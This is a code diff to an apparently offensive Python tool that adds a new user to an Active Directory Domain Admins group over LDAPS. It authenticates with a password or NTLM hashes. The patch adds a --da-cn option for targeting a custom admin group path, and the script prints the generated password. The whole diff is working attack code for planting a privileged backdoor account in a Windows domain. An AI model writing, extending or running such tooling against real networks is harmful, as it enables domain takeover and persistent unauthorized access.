@@ -24,10 +24,11 @@ def strong_pwd(n=50):
         if sum(any(c in pool for c in p) for pool in pools) >= 3:
             return p
 
-def dns(domain, sam, container) -> Tuple[str, str]:
+def dns(domain, sam, container, da_cn=None) -> Tuple[str, str]:
     base = ",".join(f"DC={x}" for x in domain.split("."))
-    return (f"CN={sam},{container},{base}",
-            f"CN=Domain Admins,CN=Users,{base}")
+    user_dn = f"CN={sam},{container},{base}"
+    group_dn = f"{da_cn},{base}" if da_cn else f"CN=Domain Admins,CN=Users,{base}"
+    return user_dn, group_dn
 
 # ───── args ─────────────────────────────────────────────────────────────────
 ap = argparse.ArgumentParser(description="Add a Domain Admin via LDAPS")
@@ -37,6 +38,7 @@ auth = ap.add_mutually_exclusive_group(required=True)
 auth.add_argument("--password");                        auth.add_argument("--hashes")
 ap.add_argument("--new-user", required=True);           ap.add_argument("--new-pass")
 ap.add_argument("--ou", default="CN=Users")
+ap.add_argument("--da-cn", help="Custom CN path for Domain Admins group (e.g., 'CN=Admins,CN=CustomOU')")
 ap.add_argument("--insecure", action="store_true");     ap.add_argument("--debug", action="store_true")
 args = ap.parse_args()
 
@@ -54,7 +56,7 @@ try:
 except (LDAPSocketOpenError, LDAPException) as e:
     sys.exit(f"[!] Bind failed: {e}")
 
-user_dn, da_dn = dns(args.domain, args.new_user, args.ou)
+user_dn, da_dn = dns(args.domain, args.new_user, args.ou, args.da_cn)
 dbg(f"User DN: {user_dn}, DA DN: {da_dn}")
 pwd = args.new_pass or strong_pwd()
 print(f"[+] Using password: {pwd}")
